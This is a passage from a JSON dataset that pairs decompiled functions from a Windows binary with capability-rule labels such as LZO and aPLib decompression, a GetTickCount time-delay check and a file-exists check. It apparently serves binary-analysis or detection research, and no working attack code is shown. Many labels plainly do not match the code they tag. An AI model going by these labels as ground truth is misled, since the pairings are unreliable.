param_2 = param_2 + iVar3 + 1;\n        iVar8 = iVar8 + 1;\n        puVar2 = puVar6 + iVar5 + -0x30;\n    } while (iVar8 != var_ch_2);\n    *(puVar6 + iVar5 + -0x34) = var_8h_2;\n    *(puVar6 + iVar5 + -0x38) = 0x423a6c;\n    uVar4 = sub.kernel32.dll_GetThreadLocale_1();\n    *(puVar6 + iVar5 + -0x38) = uVar4;\n    *(puVar6 + iVar5 + -0x3c) = var_ch_2;\n    *(puVar6 + iVar5 + -0x40) = var_10h;\n    *(puVar6 + iVar5 + -0x44) = *0x4a4df4;\n    *(puVar6 + iVar5 + -0x48) = var_1ch_2;\n    pcVar1 = *(*var_1ch_2 + 0x14);\n    puVar7 = puVar6 + iVar5 + -0x4c;\n    *(puVar6 + iVar5 + -0x4c) = 0x423a84;\n    iVar5 = (*pcVar1)();\n    if (iVar5 == -0x7ffdfffa) {\n        *(puVar7 + -4) = &stack0xfffffffc;\n        *(puVar7 + -8) = 0x423a91;\n        fcn.00423994(*(puVar7 + -4));\n    }\n    else {\n        *(puVar7 + -4) = 0x423a99;\n        fcn.00422fa8();\n    }\n    return;\n}\n",
        "token_count": 1144
    },
    "00433db0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00433dd7)\n\nvoid fcn.00433db0(void)\n\n{\n    int32_t *in_EAX;\n    code *pcVar1;\n    code **ppcVar2;\n    code **ppcVar3;\n    int32_t iVar4;\n    \n    in_EAX[1] = 0;\n    pcVar1 = fcn.00433ee0();\n    ppcVar2 = fcn.00433ea4();\n    if (ppcVar2 == NULL) {\n        fcn.00433ee4();\n        iVar4 = *in_EAX;\n        *(iVar4 + 0x14) = 0x36;\n        *(iVar4 + 0x18) = 0;\n        (***in_EAX)();\n    }\n    *ppcVar2 = fcn.00433298;\n    iVar4 = 1;\n    ppcVar2[1] = fcn.004333c8;\n    ppcVar2[2] = fcn.00433468;\n    ppcVar2[3] = fcn.0043353c;\n    ppcVar2[4] = fcn.00433620;\n    ppcVar2[5] = fcn.00433688;\n    ppcVar2[6] = 0x4336f0;\n    ppcVar2[7] = fcn.004339e0;\n    ppcVar2[8] = fcn.00433b24;\n    ppcVar2[9] = fcn.00433c6c;\n    ppcVar2[10] = 0x433d78;\n    ppcVar2[0xc] = 0x3b9aca00;\n    ppcVar2[0xb] = pcVar1;\n    ppcVar3 = ppcVar2 + 0xe;\n    do {\n        iVar4 = iVar4 + -1;\n        *ppcVar3 = NULL;\n        ppcVar3[2] = NULL;\n        ppcVar3 = ppcVar3 + -1;\n    } while (-1 < iVar4);\n    ppcVar2[0x11] = NULL;\n    ppcVar2[0x12] = NULL;\n    ppcVar2[0x13] = 0x54;\n    in_EAX[1] = ppcVar2;\n    return;\n}\n",
        "token_count": 525
    },
    "0044af68": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044af68(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int16_t in_CX;\n    int16_t in_DX;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x16b8) < 0xc) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_DX + -0x101 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 5;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_DX - 0x101U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = in_DX - 0x101U >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xb;\n    }\n    if (*(in_EAX + 0x16b8) < 0xc) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_CX + -1 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 5;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_CX - 1U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = in_CX - 1U >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xb;\n    }\n    if (*(in_EAX + 0x16b8) < 0xd) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h + -4 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 4;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h - 4U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = (arg_8h - 4U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xc;\n    }\n    iVar4 = 0;\n    puVar3 = 0x4a3e38;\n    if (0 < arg_8h) {\n        do {\n            if (*(in_EAX + 0x16b8) < 0xe) {\n                *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xa7a + *puVar3 * 4) << (*(in_EAX + 0x16b8) & 0x1f)\n                ;\n                *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n            }\n            else {\n                uVar1 = *(in_EAX + 0xa7a + *puVar3 * 4);\n                *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                iVar2 = *(in_EAX + 0x14);\n                *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                iVar2 = *(in_EAX + 0x14);\n                *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n            }\n            iVar4 = iVar4 + 1;\n            puVar3 = puVar3 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    fcn.0044a87c();\n    fcn.0044a87c();\n    return;\n}\n",
        "token_count": 1752
    },
    "00456d80": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00456d80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    \n    iVar1 = fcn.0040e7c8();\n    if (iVar1 != 0) {\n        fcn.004059a4();\n    }\n    return unaff_EBX & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 91
    },
    "004613d0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004613d0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00418198();\n    fcn.0045e9d4();\n    iVar1 = *(*(arg_8h + -8) + 8);\n    fcn.004181e8(&var_20h, \n                 ((*(iVar1 + 0x58) - *(iVar1 + 0x50)) + *(*(*(arg_8h + -4) + 0x30) + 0x4c)) - *(*(arg_8h + -4) + 0x4c));\n    fcn.0045e884();\n    return;\n}\n",
        "token_count": 184
    },
    "0047264c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047264c(uint param_1, int32_t param_2)\n\n{\n    fcn.00462eb8();\n    *(param_2 + 0x24) = *(param_2 + 0x24) & 0xfffffffc;\n    return;\n}\n",
        "token_count": 65
    },
    "00493ce0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00493ce0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x493cf9;\n    fcn.004058ec();\n    puStack28 = 0x493d01;\n    fcn.004058ec();\n    puStack28 = 0x493d09;\n    fcn.004058ec();\n    uStack32 = 0x493d92;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n    fcn.004054c0();\n    fcn.0040546c();\n    fcn.004054c0();\n    fcn.004054c0();\n    fcn.004054c0();\n    uVar1 = sub.kernel32.dll_CreateThread(0, 0, fcn.00490f58, uVar1, 0, arg_8h + -4);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405490(0x493d99);\n    return;\n}\n",
        "token_count": 323
    },
    "00404114": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.00404114(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "00437590": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00437590(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    \n    iVar1 = arg_8h >> 1;\n    if (iVar1 < 0) {\n        iVar1 = iVar1 + ((arg_8h & 1) != 0);\n    }\n    return (in_ECX * 0xff + iVar1) / arg_8h;\n}\n",
        "token_count": 102
    },
    "004375b4": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004375b4(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    return (in_ECX * 0x1fe + arg_8h + 0xff) / (arg_8h * 2);\n}\n",
        "token_count": 64
    },
    "004378fc": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004378fc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iStack28;\n    int32_t *piStack24;\n    uint8_t *puStack20;\n    \n    piVar1 = (***(in_EAX + 4))();\n    iVar5 = param_2 * 0x200 + -0x200;\n    iStack28 = 0;\n    puStack20 = 0x4a22e4;\n    piStack24 = piVar1;\n    do {\n        iVar7 = 0;\n        puVar4 = puStack20;\n        piVar6 = piStack24;\n        do {\n            iVar3 = *puVar4 * -2 + 0xff;\n            iVar2 = iVar3 * 0xff;\n            if (iVar2 < 0) {\n                iVar2 = -((iVar3 * -0xff) / iVar5);\n            }\n            else {\n                iVar2 = iVar2 / iVar5;\n            }\n            *piVar6 = iVar2;\n            iVar7 = iVar7 + 1;\n            piVar6 = piVar6 + 1;\n            puVar4 = puVar4 + 1;\n        } while (iVar7 < 0x10);\n        iStack28 = iStack28 + 1;\n        puStack20 = puStack20 + 0x10;\n        piStack24 = piStack24 + 0x10;\n    } while (iStack28 < 0x10);\n    return piVar1;\n}\n",
        "token_count": 397
    },
    "0043d3a4": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nulong fcn.0043d3a4(void)\n\n{\n    uint8_t uVar1;\n    uint8_t **ppuVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    int32_t iStack20;\n    \n    ppuVar2 = in_EAX[6];\n    puVar5 = *ppuVar2;\n    puVar7 = ppuVar2[1];\n    if (puVar7 == NULL) {\n        iVar3 = (*ppuVar2[3])();\n        if (iVar3 == 0) {\n            uVar4 = 0;\n            goto code_r0x0043d486;\n        }\n        puVar5 = *ppuVar2;\n        puVar7 = ppuVar2[1];\n    }\n    puVar7 = puVar7 + -1;\n    uVar1 = *puVar5;\n    puVar5 = puVar5 + 1;\n    if (puVar7 == NULL) {\n        iVar3 = (*ppuVar2[3])();\n        if (iVar3 == 0) {\n            uVar4 = 0;\n            goto code_r0x0043d486;\n        }\n        puVar5 = *ppuVar2;\n        puVar7 = ppuVar2[1];\n    }\n    puVar7 = puVar7 + -1;\n    puVar6 = puVar5 + 1;\n    if (uVar1 * 0x100 + *puVar5 != 4) {\n        *(*in_EAX + 0x14) = 0xb;\n        (***in_EAX)();\n    }\n    if (puVar7 == NULL) {\n        iVar3 = (*ppuVar2[3])();\n        if (iVar3 == 0) {\n            uVar4 = 0;\n            goto code_r0x0043d486;\n        }\n        puVar6 = *ppuVar2;\n        puVar7 = ppuVar2[1];\n    }\n    puVar7 = puVar7 + -1;\n    puVar5 = puVar6 + 1;\n    iStack20 = *puVar6 * 0x100;\n    if (puVar7 == NULL) {\n        iVar3 = (*ppuVar2[3])();\n        if (iVar3 == 0) {\n            uVar4 = 0;\n            goto code_r0x0043d486;\n        }\n        puVar5 = *ppuVar2;\n        puVar7 = ppuVar2[1];\n    }\n    iStack20 = iStack20 + *puVar5;\n    iVar3 = *in_EAX;\n    *(iVar3 + 0x14) = 0x52;\n    *(iVar3 + 0x18) = iStack20;\n    (**(*in_EAX + 4))();\n    in_EAX[0x45] = iStack20;\n    *ppuVar2 = puVar5 + 1;\n    ppuVar2[1] = puVar7 + -1;\n    uVar4 = 1;\ncode_r0x0043d486:\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 723
    },
    "0043d6f4": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d6f4(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    char *in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((((in_ECX < 0xc) || (*in_EDX != 'A')) || (in_EDX[1] != 'd')) ||\n       (((in_EDX[2] != 'o' || (in_EDX[3] != 'b')) || (in_EDX[4] != 'e')))) {\n        iVar6 = *in_EAX;\n        *(iVar6 + 0x14) = 0x4e;\n        *(iVar6 + 0x18) = in_ECX + arg_8h;\n        (**(*in_EAX + 4))();\n    }\n    else {\n        uVar1 = in_EDX[7];\n        uVar2 = in_EDX[8];\n        uVar3 = in_EDX[9];\n        uVar4 = in_EDX[10];\n        uVar5 = in_EDX[0xb];\n        iVar6 = *in_EAX;\n        *(iVar6 + 0x18) = in_EDX[5] * 0x100 + in_EDX[6];\n        *(iVar6 + 0x1c) = uVar1 * 0x100 + uVar2;\n        *(iVar6 + 0x20) = uVar3 * 0x100 + uVar4;\n        *(iVar6 + 0x24) = uVar5;\n        *(*in_EAX + 0x14) = 0x4c;\n        (**(*in_EAX + 4))();\n        in_EAX[0x49] = 1;\n        *(in_EAX + 0x4a) = uVar5;\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "00444170": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00444170(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    iVar4 = in_EAX[3];\n    if (param_1 == 0) {\n        piVar1 = in_EAX[8];\n        *(*piVar1 + 0x14) = 0x28;\n        (***piVar1)();\n    }\n    iVar4 = iVar4 + param_1;\n    uVar5 = (param_2 & (1 << (param_1 & 0x1f)) - 1U) << (0x18U - iVar4 & 0x1f) | in_EAX[2];\n    while( true ) {\n        if (iVar4 < 8) {\n            in_EAX[2] = uVar5;\n            in_EAX[3] = iVar4;\n            return 1;\n        }\n        puVar2 = *in_EAX;\n        *in_EAX = *in_EAX + 1;\n        uVar6 = uVar5 >> 0x10 & 0xff;\n        *puVar2 = uVar6;\n        piVar1 = in_EAX + 1;\n        *piVar1 = *piVar1 + -1;\n        if ((*piVar1 == 0) && (iVar3 = fcn.00444148(),  iVar3 == 0)) break;\n        if (uVar6 == 0xff) {\n            puVar2 = *in_EAX;\n            *in_EAX = *in_EAX + 1;\n            *puVar2 = 0;\n            piVar1 = in_EAX + 1;\n            *piVar1 = *piVar1 + -1;\n            if ((*piVar1 == 0) && (iVar3 = fcn.00444148(),  iVar3 == 0)) {\n                return 0;\n            }\n        }\n        uVar5 = uVar5 << 8;\n        iVar4 = iVar4 + -8;\n    }\n    return 0;\n}\n",
        "token_count": 497
    },
    "0041f28c": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f28c(uint param_1, int32_t param_2)\n\n{\n    if ((-0x81 < param_2) && (param_2 < 0x80)) {\n        fcn.0041f410();\n        fcn.0041f214();\n        return;\n    }\n    if ((param_2 < -0x8000) || (0x7fff < param_2)) {\n        fcn.0041f410();\n        fcn.0041f214();\n    }\n    else {\n        fcn.0041f410();\n        fcn.0041f214();\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00475d30": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t fcn.00475d30(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    iVar1 = sub.user32.dll_GetParent();\n    while ((iVar1 != 0 && (uVar2 = sub.user32.dll_GetWindowLongA(iVar1, 0xffffffec),  (uVar2 & 0x80) == 0x80))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    if (iVar1 == 0) {\n        if (*(*0x4ab078 + 0x44) != 0) {\n            uVar3 = fcn.00466ca8(0xffffffec);\n            uVar2 = sub.user32.dll_GetWindowLongA(uVar3);\n            if ((uVar2 & 0x80) == 0) {\n                iVar1 = fcn.00466ca8();\n                return iVar1;\n            }\n        }\n        iVar1 = *(*0x4ab078 + 0x30);\n    }\n    return iVar1;\n}\n",
        "token_count": 235
    },
    "004050d8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004050d8(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t **in_FS_OFFSET;\n    \n    if (*0x4a87cc != NULL) {\n        ppiVar1 = *in_FS_OFFSET;\n        if (*0x4a87cc == ppiVar1) {\n            *in_FS_OFFSET = **0x4a87cc;\n            return;\n        }\n        for (; ppiVar1 != 0xffffffff; ppiVar1 = *ppiVar1) {\n            if (*ppiVar1 == *0x4a87cc) {\n                *ppiVar1 = **0x4a87cc;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00407574": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00407574(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040756c();\n    if (iVar1 != 0) {\n        if (*0x4a17b0 == -1) {\n            fcn.00405460();\n        }\n        iVar1 = fcn.00407560();\n        if (iVar1 == 0) {\n            fcn.00405460();\n        }\n        else {\n            sub.kernel32.dll_TlsSetValue(*0x4a17b0, iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "0040a118": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040a118(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_ch;\n    iVar1 = sub.kernel32.dll_SetFilePointer_1();\n    if (iVar1 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 != 0) {\n            lpDistanceToMoveHigh = 0xffffffff;\n        }\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar1);\n}\n",
        "token_count": 138
    },
    "0040a168": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a168(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004058fc();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0040a18c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a18c(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004058fc();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "0040a384": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a384(int32_t param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    *(param_1 + 0x18) = ~param_2 & 0x16;\n    uVar1 = fcn.004058fc(param_1 + 0x20);\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1(uVar1);\n    *(param_1 + 0x1c) = iVar2;\n    if (iVar2 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n    }\n    else {\n        iVar2 = fcn.0040a300();\n        if (iVar2 != 0) {\n            fcn.0040a3f8();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 189
    },
    "0040a3f8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0040a3f8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1c) != -1) {\n        sub.kernel32.dll_FindClose_1(*(in_EAX + 0x1c));\n        *(in_EAX + 0x1c) = 0xffffffff;\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "0040d444": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d444(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x40d4a9;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    for (iVar2 = 1; *(iVar2 * 4 + 0x4a88f0) != -1; iVar2 = iVar2 + 1) {\n        if (iVar2 == 7) goto code_r0x0040d493;\n    }\n    fcn.00405664();\n    uVar1 = fcn.00409e14();\n    *(iVar2 * 4 + 0x4a88f0) = uVar1;\ncode_r0x0040d493:\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40d4b0;\n    uStack24 = 0x40d4a8;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 276
    },
    "00418210": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00418210(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*in_EAX == -1) && (in_EAX[1] == -1)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 57
    },
    "0041c414": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c414(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041966c();\n    if (iVar1 != -1) {\n        fcn.00419504();\n    }\n    iVar1 = fcn.0041966c();\n    if (iVar1 < 0) {\n        fcn.004194b8();\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "0041c7a8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0041c7a8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004164b8();\n    if (iVar1 == -1) {\n        fcn.0041c770();\n    }\n    return iVar1;\n}\n",
        "token_count": 63
    },
    "0044d3a8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d3a8(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY100;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint lpNumberOfBytesRead;\n    uint *lpBuffer;\n    uint var_4h;\n    \n    puStack32 = 0x44d3bf;\n    lpBuffer = param_2;\n    fcn.004058ec();\n    uStack36 = 0x44d44a;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(0x80000000, 1, 0, 3, 0, 0);\n    iVar2 = sub.kernel32.dll_CreateFileA_1(uVar1);\n    if (iVar2 != -1) {\n        uVar1 = sub.kernel32.dll_GetFileSize_1(iVar2, 0);\n        fcn.00406858(uVar1);\n        sub.kernel32.dll_ReadFile_1(iVar2, *lpBuffer, uVar1, &fcn.0044d3a8::lpNumberOfBytesRead, 0);\n        sub.kernel32.dll_CloseHandle_1();\n        iStackY100 = iVar2;\n    }\n    *in_FS_OFFSET = iStackY100;\n    fcn.0040546c(0x44d451);\n    return;\n}\n",
        "token_count": 355
    },
    "00456764": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00456764(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00456730();\n    if (iVar1 == -1) {\n        fcn.004538bc();\n    }\n    fcn.0045660c();\n    return;\n}\n",
        "token_count": 63
    },
    "00458220": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00458220(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_EDX;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if ((in_EDX & 0x10) == 0) {\n        iVar1 = sub.user32.dll_GetMenuItemID();\n        if (iVar1 != -1) {\n            iVar3 = fcn.0045784c();\n        }\n    }\n    else {\n        sub.user32.dll_GetSubMenu();\n        iVar3 = fcn.0045784c();\n    }\n    if (iVar3 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.004718b4();\n    }\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "0045e7d4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
